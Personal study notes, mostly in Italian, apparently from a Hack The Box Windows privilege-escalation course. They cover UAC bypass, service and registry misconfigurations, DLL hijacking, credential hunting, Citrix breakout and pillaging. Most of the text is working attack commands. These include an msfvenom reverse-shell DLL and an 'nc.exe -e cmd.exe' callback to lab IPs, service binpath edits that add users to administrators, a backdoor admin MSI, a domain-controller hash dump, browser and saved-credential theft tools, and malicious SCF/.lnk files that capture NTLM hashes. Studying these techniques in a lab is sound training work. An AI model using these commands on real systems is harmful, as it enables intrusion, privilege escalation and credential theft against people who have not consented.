## Retrieving NTLM hashes from Domain Controllers
`j4k1dibe@htb[/htb]$ secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator`

# UAC User Access Control
Le applicazioni hanno diversi integrity levels. e un programma con alti integrity level puo' fare azioni che possono compromettere il sistema.

UAC e' una feature che abilita un prompt di consenso per attivita' che richiedono certi privilegi.

When a standard user attempts to run an app that requires an administrator access token, UAC requires that the user provides valid administrator credentials.

Quando UAC e' abilitato le applicazioni e le task runnano sempre come non amministratore a meno che un amministratore permetta esplicitamente alle applicazioni di eseguire con permessi da administrator.

E' una feature conveniente che previene cambiamenti non voluti daglia admin ma **NON E' UN SECURITY BOUNDARY**.

UAC puo' dare piu' access rights al Token di un  applicazione

The default RID 500 administrator account always operates at the high mandatory level. With Admin Approval Mode (AAM) enabled, any new admin accounts we create will operate at the medium mandatory level by default and be assigned two separate access tokens upon logging in. In the example below, the user account sarah is in the administrators group, but cmd.exe is currently running in the context of their unprivileged access token.

### Confirming UAC is Encabled
`C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA`

### Checking UAC Level
`C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin`

## Bypassing UAC

Bypassare UAC dipende molto dalla versione di windows installata.

`PS C:\htb> [environment]::OSVersion.Version` con questo comando vediamo la Build del nostro Windows.

da questa pagina possiamo vedere a quale release appartiene: https://en.wikipedia.org/wiki/Windows_10_version_history

**UACME** (https://github.com/hfiref0x/UACME) mantiene una lista di UAC BYpass in base alle varie Build di Windows e se windows ha fatto security updates.

Molto spesso sfruttano eseguibili che windows permette di autoelevarsi come ad esempio SystemPropertiesAdvanced.exe. (che cerca una Dll che non esiste e possiamo fare Dll Hijacking).

Quando windows carica una Dll fa questo ordine:

1) The directory from which the application loaded.
2) The system directory C:\Windows\System32 for 64-bit systems.
3) The 16-bit system directory C:\Windows\System (not supported on 64-bit systems)
4) The Windows directory.
5) Any directories that are listed in the PATH environment variable.

### Printa la PATH env var
`PS C:\htb> cmd /c echo %PATH%`

### Generiamo una Dll che carichera' quell'exe li'
`j4k1dibe@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll`

### Eseguiamo SystemPropertiesAdvanced
`C:\htb> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe`


# Weak Permissions
Questo tipo di vulnerabilita' non sono comuni su applicazioni fatte da grandi produttori di software, ma sono comuni su software fatti da piccole aziende che vendono a produttori piu' grandi.

Spesso i Servizi si installano con privilegi di SYSTEM

## Permissive File System ACLs

### Running SharpUp
Possiamo runnare SharpUp dal GhostPack (https://github.com/GhostPack/SharpUp/)per checkare per eseguibili di servizi con ACL deboli

`PS C:\htb> .\SharpUp.exe audit` Se troviamo un binario modificabile **=== Modifiable Service Binaries ===**  e magari e' un servizio che ad ogni restart viene eseguito potremmo avere una shell.
  PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
  
  
### Checking Permissions with icacls
Possiamo usare il built-in **icacls** per verificare se effettivamente e' vulnerabile 
`PS C:\htb> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"`
Everyone:(I)(F) Cio' significa che ognuno puo'  manipolare questo eseguibile

### Replacing Service Binary
```
C:\htb> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
C:\htb> sc start SecurityService
```

## Weak Service Permissions
runnando `C:\htb> SharpUp.exe audit`. esce fuori **=== Modifiable Services ===** quindi e' potenzialmente configurato male.

Possiamo usare **AccessChk** dai Sysinternals per enumerare i permessi sul servizio.

The flags we use, in order, are **-q** (omit banner), **-u** (suppress errors), **-v** (verbose), **-c** (specify name of a Windows service), and **-w** (show only objects that have write access). Here we can see that all Authenticated Users have SERVICE_ALL_ACCESS rights over the service, which means full read/write control over it.

`C:\htb> accesschk.exe /accepteula -quvcw WindscribeService`

`C:\htb> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"` Cambiamo il path dell' eseguibile e ci aggiungiamo agli amministratori.

Vabbe' poi lo stoppiamo e poi lo Restartiamo.

N.B. E' NORMALE CHE QUANDO LO RESTARTIAMO DIA ERRORE PERCHE' NEL BINPATH ABBIAMO MESSO UN COMANDO E NON UN ESEGUIBILE.


## Cleanup

### Reimpostare il Path dell' eseguibile
`C:\htb> sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"`

### Restartare il servizio
`C:\htb> sc start WindScribeService`

### Verifichiamo che il servizio sta runnando
`C:\htb> sc query WindScribeService`


## Unquoted Service Path

Quando un servizio e' installato  la configurazione di registro deve contenere il path al binario che deve essere eseguito.
Se il binario non e' contenuto nelle quote "" Windows provera' a localizzare il binario in molte cartelle.

per esempio:
se il path del binario e':

`C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe`

Windows Provera' a caricare questi eseguibili con un .exe

```
C:\Program(.exe)
C:\Program Files(.exe)
C:\Program Files (x86)\System(.exe)
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64(.exe)
```

Se quindi possiamo scrivere un .exe prima che arrivi a quello vero possiamo eseguirlo quando si va a eseguire il servizio.

### Searching for Unquoted Service Paths

`C:\htb> wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """`

Purtroppo molto spesso non si puo' scrivere nella root directory o Program Files folder a meno che non si e' amministratori.
Quindi MOLTO spesso si trovano unquoted service paths ma non sempre sono exploitabili


## Permissive Registry ACLs

E' anche utile cercare per weak ACL nei registri di WIndows usando **AccessChk**.

`C:\htb> accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services` Checka l' utente mrb3n che permessi ha su le reg keys dei servizi.

```
RW HKLM\System\CurrentControlSet\services\ModelManagerService
        KEY_ALL_ACCESS
```
Questo output significa che si puo' editare la reg entry.

### Changing ImagePath with Powershell
`PS C:\htb> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"`


## Modifiable Registry Autorun Binary

### Check Startup Programs
Possiamo usare WMIC per vedere quali programmi si eseguono all' avvio. Supponendo permessi di scrittura sul registro per un binario 

`PS C:\htb> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl`


# Kernel Exploits

L' avere computer sempre aggiornati non e' facile per niente.

questo sito aiuta a trovare CVE per Windows: **https://msrc.microsoft.com/update-guide/vulnerability**

Vulnerabilita' da ricordarsi:
- MS08-067
- MS17-010
- ALPC Task Scheduler 0-Day
- CVE-2021-36934 HiveNightmare, aka SeriousSam
- CVE-2021-1675/CVE-2021-34527 PrintNightmare  

## Enumerating Missing Patches

```
PS C:\htb> systeminfo
PS C:\htb> wmic qfe list brief
PS C:\htb> Get-Hotfix
```

`C:\htb> wmic qfe list brief`


# Vulnerable Services

Possiamo essere in grado di fare privesc su sistemi patchati e configurati bene se  gli utenti hanno il permesso di installare applicazioni di terze parti vulnerabili.

E' comune trovare molte applicazioni e servizi diversi su windows, alcuni servizi/applicazioni ci permettono di fare privesc a SYSTEM.

### Enumerate Installed Programs

```
C:\htb> wmic product get name

Name
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29910
Update for Windows 10 for x64-based Systems (KB4023057)
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127
VMware Tools
Druva inSync 6.6.3
Microsoft Update Health Tools
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29910
Update for Windows 10 for x64-based Systems (KB4480730)
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127
```

E dopo possiamo checkare se questi programmi sono vulnerabili
Druva inSync 6.6.3 e' vulnerabile (PoC: https://www.exploit-db.com/exploits/49211) e gira in porta 6064.

### Enumerating Local Ports
prima abbiamo visto che Druva inSync gira su porta 6064.

`C:\htb> netstat -ano | findstr 6064`

Si vede anche il PID del processo. (PID=3324)

### Enumerating PID
`PS C:\htb> get-process -Id 3324`

### Enumerating Running Service
`PS C:\htb> get-service | ? {$_.DisplayName -like 'Druva*'}` Al posto di Druva mettice il nome del servizio che cerchi.


# Dll injection

Dll injection consiste nel caricare una Dll in un processo remoto.

## Dll injection semplice
Dll injection semplice consiste nel:
1) Prendere un handle al processo target
2) Allocare memoria nel processo target e scriverci la Dll
3) Prendere l' indirizzo della funzione **LoadLibraryA** con **(LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");**
4) Creare un Thread remoto con **CreateRemoteThread** nel processo remoto e eseguire LoadLibraryA come callback e argomento la nostra Dll


## Manual Mapping
E' un metodo complesso e avanzato di Dll injection. Evita la detection facile non usando la WinAPI31 LoadLibrary.

1) Caricare la Dll come raw data nel processo target
2) Mappare le sezioni del Dll nel processo target (le parso?)
3) Iniettare shellcode nel proceso target ed eseguilo. Questo shellcode riloca la Dll parsando gli import ed esegue le callback del TLS(Thread Local Storage) e infine chiama la Dll main

## Reflective Dll Injection
E' una tecnica che usa il reflective programming per caricare la dll in memoria di  un processo.
La libreria stessa e' responabile per caricarsi nel processo implementando un minimal PE loader.

Step:
1) L' esecuzione e' trasferita alla **ReflectiveLoader function**. una funzione esportata che sta nella export table della Dll. Questo si puo' fare con **CreateRemoteThread** o un minimal bootstrap shellcode.
2) Il file PE della Dll sta in una zna arbitraria di memoria. **ReflectiveLoader** function calcula la location in memoria per parsare gli Header
3) ReflectiveLoader poi parsa la Kernel32.dll export table del target process per trovare indirizzi di **LoadLibraryA, GetProcAddress e VirtualAlloc**
4) RefletiveLoader ora alloca una zona di memoria contigua dove carica l'immagine PE. (dopo verra' rilocata)
5) Gli heade e sezioni del PE sono caricati nella nuova zona di memoria.
6) la ReflectiveLoader carica eventuali librerie aggiiuntive  e risolve gli indirizzi delle funzioni importate.
7) ReflectiveLoader processauna nuova copia della Dll Relocation Table
8) ReflectiveLoader chiama il nuovo entry point, la DllMain con DLL_PROCESS_ATTACH e si esege la main
9) Infine la ReflectiveLoader ritorna esecuzione al bootstrap shellcode che l'ha chiamata

## Dll Hijackng
Dll hijacking e' una tecnica per caricare Dll in un processo. Queste Dll possono essere caricate a runtime spesso se un applicazione non specifica il **FULL PATH** della Dll da chiamare.

Il Dll searcch order dipende se **Safe DLL Search Mode** e' attivato(di default e' attivato). se e' attivato la user's current directory viene messa in basso.
E' facile disabilitare Safe Dll Search Mode modificando la registry key.

1) Press Windows key + R to open the Run dialog box.
2) Type in Regedit and press Enter. This will open the Registry Editor.
3) Navigate to HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager.
4) In the right pane, look for the SafeDllSearchMode value. If it does not exist, right-click the blank space of the folder or right-click the Session Manager folder, select New and then DWORD (32-bit) Value. Name this new value as SafeDllSearchMode.
5) Double-click SafeDllSearchMode. In the Value data field, enter 1 to enable and 0 to disable Safe DLL Search Mode.
6) Click OK, close the Registry Editor and Reboot the system for the changes to take effect.


With this mode enabled, applications search for necessary DLL files in the following sequence:

1) The directory from which the application is loaded.
2) The system directory.
3) The 16-bit system directory.
4) The Windows directory.
5) The current directory.
6) The directories that are listed in the PATH environment variable.

However, if 'Safe DLL Search Mode' is deactivated, the search order changes to:

1) The directory from which the application is loaded.
2) The current directory.
3) The system directory.
4) The 16-bit system directory.
5) The Windows directory
6) The directories that are listed in the PATH environment variable

Per fare Dll Hijacking prima devi trovare la Dll che il target sta provando a caricare. Ci sono tool specifici
1) **Process Explorer**. della Sysinternals suite. da info sui running process
2) **PE Explorer**, puo' aprire un PE e vedere da quali Dll si importano le funzioni

## Proxying
Possiamo usare un metodo chiamato Dll Proxying per eseguire l' Hijack.
Creiamo una nuova Dll che avra' la funzione che viene esportata da quella 

1) Creare una nuova Dll, con lo stesso nome di quella da hijackare, ed in grado di eseguire le funzioni della Dll originale.
2) Caricare le funzioni originali dalla Dll effettiva
3) Ritornare le

## Invalid Libraries
Un altra opzione per fare Hijack e' rimpiazzare una Dll valida che un programma sta provando a caricare ma NON TROVA con una nostra Dll.

filtro per procmon: **If we change the procmon filter to focus on entries whose path ends in .dll and has a status of NAME NOT FOUND we can find such libraries in main.exe.**

poi basta che scriviamo la dll 


# Credential Hunting

Le credenziali ci possono dare molti vantaggi durante gli assesment.

## Application Configuration Files

`PS C:\htb> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml` cerca la stringa password in tutti i file con quelle estensioni.

Sensitive IIS information such as credentials may be stored in a web.config file. (C:\inetpub\wwwroot\web.config non solo questo path)

## Dictionary Files

### Chrome Dictionary Files
`PS C:\htb> gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password`

## Unattended Installation Files
Questi file possono definire auto-logon settings o account aggiuntivi da creare come parte dell' installazione.

password in **unattend.xml** sono storate in plaintext o base64 encoded.

Although these files should be automatically deleted as part of the installation, sysadmins may have created copies of the file in other folders during the development of the image and answer file.

## Powershell History File

da windows10 Powershell stora la history in **C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt.**

### Confirming PowerShell History Save PAth
Ci sono molti comandi che passano le credenziali in command line.

`PS C:\htb> (Get-PSReadLineOption).HistorySavePath` Printa il save path delle credenziali.

### Reading powershell history file

`PS C:\htb> gc (Get-PSReadLineOption).HistorySavePath`

### Reading every powershell history path that we can access

`PS C:\htb> foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}`


## Powershell Credentials

Powershell credentials sono spesso usate per scripting e task di automazione come un modo di storare credenziali criptate in modo conveniente.

Spesso sono protette da **DPAPI** che significa che possono essere decriptate solo dall'utente e dallo stesso computer che le hanno create.

```
# Connect-VC.ps1
# Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $decryptedPassword
```
### Decrypting powershell credentials

```
PS C:\htb> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
PS C:\htb> $credential.GetNetworkCredential().username

bob


PS C:\htb> $credential.GetNetworkCredential().password

Str0ng3ncryptedP@ss!
```

# Other Files for credential Theft
 In an Active Directory environment, we can use a tool such as Snaffler to crawl network share drives for interesting file extensions such as .kdbx, .vmdk, .vdhx, .ppk, etc.

 Potremmo trovare virtual hard drive che possiam montare ed estrarre hash degli amministratori, chiavi SSH private o file che hanno le password.

 molte aziende danno ad ongi impiegado una cartella su una share mappata al loro User ID.

## Cercare manualmente credenziali nel sistema
possiamo usare alcuni comandi di questo cheatsheet (https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/)

cerchiamo stringa password nei file

`C:\htb> cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt`, ti dice solo il file

`C:\htb> findstr /si password *.xml *.ini *.txt *.config`, ti dice file e contenuto

`C:\htb> findstr /spin "password" *.*`, ti dice file e contenuto

`PS C:\htb> select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password` con powershell, dice file e contenuto


### Search for file extensions
`C:\htb> dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*`

`C:\htb> where /R C:\ *.config`

`PS C:\htb> Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore` con powershell

## Sticky Note Passwords
Spesso le persone usano l' app StickyNotes su windows per salvare info e password, senza realizzare che e' un Database.

`C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`
usando https://sqlitebrowser.org/dl/ possiamo caricare il DB e leggerlo

oppure usiamo uno script in PowerShell per leggere il DB(https://github.com/RamblingCookieMonster/PSSQLite)

`PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process`, disbilitiamo execution policy

```
PS C:\htb> cd .\PSSQLite\
PS C:\htb> Import-Module .\PSSQLite.psd1
PS C:\htb> $db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
PS C:\htb> Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
```
### Using strings to view DB content

si puo' anche usare il comando strings per vedere la roba

`j4k1dibe@htb[/htb]$  strings plum.sqlite-wal`


## Altri file interessanti
```
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```
# Further Credential Theft

## Cmdkey saved credentials
il comando **cmdkey** si puo' usare per creare list ed eliminare stored password e username. Alcuni utenti vogliono storare credenziali per usarle senza inserire le password.

```
C:\htb> cmdkey /list

    Target: LegacyGeneric:target=TERMSRV/SQL01
    Type: Generic
    User: inlanefreight\bob
```
### Runas commands as another User
Possiamo provare a riusare le credenziali usando **runas**, per mandarci una revshell con un utente.

`PS C:\htb> runas /savecred /user:inlanefreight\bob "COMMAND HERE"` runnare il comando con le savecred

## Browser Credentials

Spesso gli utenti storano le credenziali nei loro browser per i siti che visitano spesso.
Possiamo usare un tool come https://github.com/GhostPack/SharpDPAPI per retrievare cookie, password e login da Google Chrome.

`PS C:\htb> .\SharpChrome.exe logins /unprotect`

## Password Managers
Molte aziende danno ai propri utenti dei password manager.
Avere accesso a un password manager ci potrebbe dare accesso a privilegi altissimi.
Possiamo avere accesso a password manager tramite Password Reuse o guessing weak/common passwords.

Ad esempio se si usa **KeePass** come password manager lui stora le password in un databse **.kdbx**  criptato con una password. 
Potremmo usare tool come **hashcat o keepass2john** per craccare.

`j4k1dibe@htb[/htb]$ python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx ` 

`j4k1dibe@htb[/htb]$ hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt` 13400 e' la hash mode per KeePass.



## Email
Se abbiamo accesso ad un domain-joined system nel contesto di domain user con una MIcrosoft Exchange Inbox possiamo provare a cercare la user mail con termini come pass, creds, credentials usando il tool **MailSNiper** (https://github.com/dafthack/MailSniper)

## More Fun with Credentials

Quando tutto fallisce possiamo runnare il tool **LaZagne** (https://github.com/AlessandroZ/LaZagne) per retrievre credenziali da una grande gamma di software come browser, chat, mem dump etc. etc.

per runnare tutti i moduli di LaZagne: 
`PS C:\htb> .\lazagne.exe all`


## Even More Fun with Credentials
We can use SessionGopher(https://github.com/Arvanaghi/SessionGopher) to extract saved PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP credentials. The tool is written in PowerShell and searches for and decrypts saved login information for remote access tools. 

cerca le HKEY_USERS per tutti gli utenti che hanno loggato in un domain-joined host.

```
PS C:\htb> Import-Module .\SessionGopher.ps1
 
PS C:\Tools> Invoke-SessionGopher -Target WINLPE-SRV01
```

## Clear-Text Password Storage in the Registry
Alcuni programmi e configurazioni windows storano password in clear text nei registri di istema.

### Windows Autologon
Windows autologon e' una feature che permette di configurare il proprio Windows OS per loggare automaticamente in un utente specifico, senza richiedere input di username paswsord allo startup.

Se sta feature e' abilitat allora **username e password stanno in cleartext nei registri**.

`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

The typical configuration of an Autologon account involves the manual setting of the following registry keys:

- AdminAutoLogon - Determines whether Autologon is enabled or disabled. A value of "1" means it is enabled.
- DefaultUserName - Holds the value of the username of the account that will automatically log on.
- DefaultPassword - Holds the value of the password for the user account specified previously.

`C:\htb>reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"`

### Putty
Putty quando si salva una sessione le credenziali sono storate nei registri. in clear text

`Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>`

Note that the access controls for this specific registry key are tied to the user account that configured and saved the session.
Therefore, in order to see it, we would need to be logged in as that user and search the HKEY_CURRENT_USER hive. Subsequently, if we had admin privileges, we would be able to find it under the corresponding user's hive in HKEY_USERS.

trovo le sessioni salvate:
```
PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

`PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh`


## WiFi Passwords

### Viewing Saved Wireless Networks
Se otteniamo local admin access ad una macchina con una scheda wireless possiamo listare tutte le reti wireless a cui ci siamo connessi

`C:\htb> netsh wlan show profile`

### Retrieving saved Wireless Passwords
spesso possiamo prendere le Pre-Shared key salvate

`C:\htb> netsh wlan show profile nome_rete key=clear`

# Citrix Breakout

ormai molte organizzazioni virtualizzano su piattaforme tome Terminal Services, Citrix, AWS AppStream, etc.etc. per dare accesso remoto ai prodotti.

comunque ci sono misure di **lock-down** mei loro ambienti desktop per minimizzare impatti di dipendenti malevoli, percio' se vogliamo fare PrivEsc dovrebbo fare un break-out da questo ambiente protetto.

metodologia di base per fare break-out:

1) Gain access to a **Dialog Box**
2) Exploit the dialog bo to achieve **command execution**
3) **escalate privileges** to gain higher level of access.

in ambienti con minimo hardening ci potrebbe pure essere una shortcut a cmd.exe nello start menu. in ambienti con maggiore hardening ogni tentativo di localizzare cmd.exe o powershell.exe nello start menu non da risultati.

Avere un CMD in un ambiente ristretto da molto piu' controllo.

CI sono molti modi per fare break-out da Citrix, noi parleremo solo di alcuni metodi.

```
Visit http://humongousretail.com/remote/ using the RDP session of the spawned target and login with the provided credentials below. After login, click on the Default Desktop to obtain the Citrix launch.ica file in order to connect to the restricted environment.

Code: citrixcredentials
Username: pmorgan
Password: Summer1Summer!
  Domain: htb.local
```

## Bypassing Path Restrictions

Quando proviamo a visitare **C:\Users** usando File explorer vediamo che e' ristretto. significa che la group lolicy restringe utenti di fare browsing nelle directory di C:\ usando File Exlorer.

E' possibile in qesti scenari usare i **Windows Dialog Boxes** per bypassare le restrizioni della group policy.

Molte app deployate via Citrix  hanno funzionalita' che gli permette di interagire con file sul sistema come Save as, Open, load etc.etc e tramite queste possiamo invokare un dialog box.

useremo **MS Paint**

1) Run Paint
2) start menu **File > Open**
3) possiamo inserire il  UNC path nel file name \\127.0.0.1\c$\users\pmorgan con File-Type settato a **All-Files**

## Accessing SMB shares from restricted env

File explorer non ha accesso diretto alle share SMB. comunque usando il **UNC Path**(https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths) possiamo accedere.

1) Startiamo un server SMB sulla nostra macchina:
   `root@ubuntu:/home/htb-student/Tools# smbserver.py -smb2support share $(pwd)` (Impacket's smbserver.py script.)
2) inseriamo il UNC path \\10.13.38.95\share
3) possiamo eseguire file della nostra Share.
   possiamo anche solo mettere un semplice pwn.exe
```
#include <stdlib.h>
int main() {
  system("C:\\Windows\\System32\\cmd.exe");
}
```

## Alternate Explorer
In altri casi in cui File Explorer e' ristretto possiamo usare File SYstem Editors come **Q-Dir** o **Explorer++**.

## Alternate Registry Editors
Similarly when the default Registry Editor is blocked by group policy, alternative Registry editors can be employed to bypass the standard group policy restrictions. Simpleregedit, Uberregedit and SmallRegistryEditor are examples of such GUI tools that facilitate editing the Windows registry without being affected by the blocking imposed by group policy. These tools offer a practical and effective solution for managing registry settings in such restricted environments.

## Modify existent shortcut file
possiamo provare a modificare shortcut gia' esistenti mettendo il path dell'eseguibile che pare a noi.

1) right click sulla shortcut desiderata
2) proprieta'> target mettiamo C:\Windows\System32\cmd.exe
3) execute shortcut

In cases where an existing shortcut file is unavailable, there are alternative methods to consider. One option is to transfer an existing shortcut file using an SMB server. Alternatively, we can create a new shortcut file using PowerShell as mentioned under Interacting with Users section under Generating a Malicious .lnk File tab. These approaches provide versatility in achieving our objectives while working with shortcut files.

## Script Execution

Quando le estensioni **.vbs, .bat o .ps** sono configurate per essere eseguibili rispettivamente dai propri interpreti da' la possibilita' di droppare uno script che serve come console interattiva .

1) crea un nuovo file di testo e rinominalo "evil.bat"
2) apri "evil.bat" con text editor
3) scrivi "cmd"

# Escalating Privileges 

possiamo runnare Winpeas e PowerUp per identificare potenziali vulnerbilita'

ad esempio usando PowerUp.ps1 troviamo che la chiave **Always Install Eleveted e' settata**

`C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` verifichiamo.

Possiamo usare la funzione di PowerUp **Write-UserAddMSI** per aggiungere un utente con script .msi.

```
PS C:\Users\pmorgan\Desktop> Import-Module .\PowerUp.ps1
PS C:\Users\pmorgan\Desktop> Write-UserAddMSI
	
Output Path
-----------
UserAdd.msi
```

Ora eseguiamo UserAdd.msi  che ha creato un nuovo utente **backdoor:T3st@123** nel guppo Administrators.

poi facciamo 

`runas /user:backdoor cmd`  e prendiamo cmd come utente.

## Bypassing UAC
Anche se il nuovo membro e' negli amministratori c'e' UAC.

```
C:\Windows\system32> cd C:\Users\Administrator

Access is denied.
```

proviamo con:
```
PS C:\Users\Public> Import-Module .\Bypass-UAC.ps1
PS C:\Users\Public> Bypass-UAC -Method UacMethodSysprep
```

# Interacting with Users
Spesso gli utenti sono l' annello piu' debole dell' organizzazione.

Un impiegato stressato puo' non notare cose strane nella sua macchina o eseguire file o cliccare su link.

Windows ha un' attack surface gigante, quando abbiamo esaurito le opzioni possiamo guardare a tecniche specifiche per rubare credenziali da un utente che non se l' aspetta.

## Traffic Capture
Se wireshark e' installato utenti non privilegiati possono catturare il traffico. 

il tool **net-cred** (https://github.com/DanMcInerney/net-creds) puo' essere tunnato per sniffare password e hash da un interfaccia live o un file pcap.

Si puo' lasciare questo tool runnare in background durante tutto l'assesment.

## Process Command Lines

Possiamo runnare uno script che analizza tutto cio' che viene eseguito in command line

```
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}
```
Monitora ogni 2 secondi cio' che viene scritto in command line.

## Vulnerable Services

Possiamo incontrare situazioni dove abbiamo un host che esegue un app vulnerabile che possiamo usare per PrivEsc.

## SCF on a File Share
SCF Shell Command File e' usato da windows explorer per muoversi su e giu per le directories.
UN file SCF puo' essere manipolato per avere il file Icona che punta ad un UNC path specifico e startare.

Se mettiamo il file icona ad un Server SMB che controlliamo e fargli runnare un tool tipo Responder, Inveigh, or InveighZero, possiamo spesso catturare NTLMv2 password hash per ogni utente che browsa la share.

Puo' essere molto utile se possiamo  avere write access alla share.

### Malicious SCF File
```
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

### Starting Responder
`j4k1dibe@htb[/htb]$ sudo responder -wrf -v -I tun0` startiamo Responder e aspettiamo che un utente navighi nella share.

### Cracking NTLMv2 hash with Hashcat
`j4k1dibe@htb[/htb]$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt`

## Capturing Hashes with Malicious .lnk File

SCFs non funzion piu' sui Server 2019 ma possiamo fare la stessa cosa con i file **.lnk**  semore costringendo a caricare un file nel nostro server SMB

```
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```


# Pillaging

Il pillaging e' il processo di ottenere informazioni da un sistema compromesso.
Informazioni tipo personal info, corporate blueprints, credit card data, info sul server etc.e5c.

## Data Sources

- Installed Applications
- Installed Services (sito web, file share, databse, name server, certificati, source code server, virtualization, backup, logging systems)
- Sensitive Data (Keylogging, Screen Capture, Network traffic capture, Previous audit reports)
- User information (history files, roles and privileges, web browser, IM clients)

## Installed Applications
`C:\>dir "C:\Program Files"`
### Installed programs Via Powershell and Reg key
```
PS C:\htb> $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\htb> $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\htb> $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```

Se ad esempio vediamo **mRemoteNG** e' un servizio che salva credenziali in un file **confCons.xml** e usa una password hardcodata **mR3m**.
**python script per decriptare le password**: https://github.com/haseebT/mRemoteNG-Decrypt

### For loop per crackare le PW
